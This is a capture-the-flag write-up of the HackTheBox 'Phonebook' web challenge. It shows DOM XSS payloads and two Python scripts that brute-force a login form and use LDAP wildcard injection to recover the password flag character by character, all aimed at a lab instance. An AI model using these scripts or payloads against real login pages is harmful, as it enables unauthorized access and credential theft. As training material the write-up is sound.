---
title: Phonebook [HackTheBox] Writeup
author: Arijit Bhowmick [sys41x4]
date: 2021-03-23 18:32:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [HackTheBox, Easy, phonebook, Web, Challenge, writeup, python3, python]
permalink: "/HTB/challenge/web/Phonebook.html"
---


[![HTB Img](/assets/htb/htb-img/htb_logo.jpeg)](http://hackthebox.eu)

## Challenge Description

![Challenge Details](/assets/htb/challenge/web/phonebook/img/challenge_desc.png)

```
Who is lucky enough to be included in the phonebook?
```
## SOLUTION

Click on the `Start Instance` button to start the challenge.

The you are provided with an `website's address` copy it and open it in another tab or browser.
In my case it was `http://206.189.121.131:30184`

### Homepage of the Webapp :

![homepage](/assets/htb/challenge/web/phonebook/img/homepage.png)


The Webapp ask us to Login to the application.
But we don't have any credentials, but we have a text in the homepage where it says 
`New (9.8.2020): You can now login using the workstation username and password! - Reese`

So `Reese` may or may not be the username.

I tried to use `SQL injection` at first but it didn't work for me.

![authentication_failure](/assets/htb/challenge/web/phonebook/img/authentication_failure.png)


### XSS :

After modifying the url,  I tried to use XSS attack.
First with `alert(1)`, so the modified url becomes 
`http://206.189.121.131:30184/login?message=<script>alert(1);</script>`
but it doesn't work.

Then, after viewing the source code of the webpage, I thought of using `DOM XSS`

![homepage_source_code](/assets/htb/challenge/web/phonebook/img/homepage_source_code.png)

Then the **xss payload** would be `<img src='x' onerror='alert(1)'>`
and the url would be:
`http://206.189.121.131:30184/login?message=<img src='x' onerror='alert(1)'>`

Yeah it worked, it's a `DOM XSS` :)

![DOM_XSS](/assets/htb/challenge/web/phonebook/img/DOM_XSS.png)


But this is not, how I solved the challenge.
I didn't find anything after that as I am not an expert in Web challenges as for now.


## Solution :

So I thought of using special characters in the **Login** and **Password** Fields.
After, using 2-3 special character, I got a blank page while using `\` in **Login** and **Password** fields.

![during_500_error](/assets/htb/challenge/web/phonebook/img/during_500_error.png)

While using python for testing it's details, I got that it is giving a `500` status code.

As I am a bit lazy, I started to build a `Bruteforce` script for testing all the special characters.
At first I created the script to list all the `status code, username, and password` during the testing of status code.

![special_chr_testing](/assets/htb/challenge/web/phonebook/img/special_chr_testing.png)

I found out that there are lots of credentials that provides `500` status code.
So, I modified the script to output only  `200` status code.

![special_chr_status_200](/assets/htb/challenge/web/phonebook/img/special_chr_status_200.png)

The special character exploit code is:

```python
# Arijit-Bhowmick [sys41x4]

import requests

url = "http://206.189.121.131:30184/login"

user_name, passwd =  "", ""

data = {"username":user_name, "password":passwd}

#special_characters = (32–47 / 58–64 / 91–96 / 123–126)

char = ''

chr_num_dict= {32:47, 58:64, 91:96, 123:126}

for start in chr_num_dict.keys():
	for j in range(start, chr_num_dict[start]+1):
		char+=chr(j)

for uname_chr in char:
	
	user_name = uname_chr

	for passwd_chr in char:
		
		passwd = passwd_chr

		r = requests.post(url, data=data)

		if (r.status_code != 500) and ("Please login" not in r.text):

			print(f"STATUS_CODE = {r.status_code}   ||  USERNAME = {user_name} | PASSWORD = {passwd}")
			
		elif (r.status_code != 404) or ("Please login" in r.text):
			
			#print(f"TEST >>> STATUS_CODE = {r.status_code}   ||  USERNAME = {user_name} | PASSWORD = {passwd}") # For testing purpose
			continue
```

After searching about this exploit, I found a website, and it has a similar behavior as the Webapp.

<a href='https://www.netsparker.com/blog/web-security/ldap-injection-how-to-prevent' target='_blank'>How to prevent LDAP injection</a>

And I thought, may be it is a `LDAP Injection`
And, it was absolutely new to me :)

After reading, it for quite a bit. I thought of writing another `Bruteforce script` for finding `username` and `password`

At first I thought that I have to find both `username` and `password` to solve the challenge, but in fact we actually don't require a username to solve the challenge XD

### Exploit Script :

```python
# Arijit-Bhowmick [sys41x4]

import requests
import time

url = "http://206.189.121.131:30184/login"

user_name, passwd =  "", ""

#data = {"username":user_name, "password":passwd} # For testing purpose

#num_characters = (48 - 57)
#alphabet_chr = (65-90)/(97-122)
#special_characters = (32–47 / 58–64 / 91–96 / 123–126)

char = ''

chr_num_dict= {97:122, 65:90, 48:57, 32:47, 58:64, 91:96, 123:126}

for start in chr_num_dict.keys():
	for j in range(start, chr_num_dict[start]+1):
		char+=chr(j)

char=char.replace("*", '')


def chr_selector(track):

	return char[track]


def cred_finder(cred_to_find):
	
	global user_name
	global passwd



	test_user = ''
	track = 0


	if cred_to_find == "user_name":

		pass_character = ''
		validate_usr = ''
		validate_pass = "*"

		try:
			if passwd[-1] != "*":

				passwd += "*"

		except:
			pass
		

	elif cred_to_find == "passwd":

		usr_character = ''
		validate_usr = "*"
		validate_pass = ''

		try:
			if user_name[-1] != "*":
				user_name += "*"
		except:
			pass
		
	else:

		exit()



	while True:

		try:
			if cred_to_find == "user_name":

				usr_character = chr_selector(track)

			elif cred_to_find == "passwd":

				pass_character = chr_selector(track)


			r_ = requests.post(url, data={"username":user_name+usr_character+"*", "password":passwd+pass_character+"*"})


			if  (r_.status_code == 200) and ("No search results." in r_.text):

				user_name+=usr_character
				passwd+=pass_character
				
				r = requests.post(url, data={"username":user_name+validate_usr, "password":passwd+validate_pass})

				track=0

				print(f"Partially valid --> USERNAME : {user_name.replace('*', '')} | PASSWORD : {passwd.replace('*', '')}")
						
				if (r.status_code == 200) and ("No search results." in r.text):
					print(f"valid --> USERNAME : {user_name} | PASSWORD : {passwd}")

					break
				

				else:
					track+=1

			else:
				#print(f"Invalid --> USERNAME : {user_name+usr_character} | PASSWORD : {passwd+pass_character}") # For testing purpose
				track+=1

		except KeyboardInterrupt:
			exit()

		except:
			
			# If the host is not available due to excessive brutefore attack
			# then it will wait some time to send another request
			wait=5
			time.sleep(wait)
			print(f"\nCouldn\'t able to reach {url}   |  Waiting for {wait} seconds\n")


print("Starting Attack\n")

#cred_finder('user_name') # Find the Username
cred_finder('passwd') # Find the Passwd

```

No `proxy` has been used in this script.
You can also run it with `proxy` if you want to.

It may be possible that the webapp will not respond, because of `bruteforce attack`, which can lead to `DDOS Attack`
in that case the script will wait for 5 seconds before sending next request to the webapp.


This script is capable of finding `username` as well as `password`

![brute_user](/assets/htb/challenge/web/phonebook/img/brute_user.png)

But in this case we have to find the `password` only to solve the challenge.
The `password` is the `flag` for this challenge

![brute_pass](/assets/htb/challenge/web/phonebook/img/brute_pass.png)

This is how, I solved this challenge.

Thankyou, for reading my writeup :)<br>
Hope, I would see you in my next writeup.

<a href="/support/sys41x4">Support Me</a> if you want to.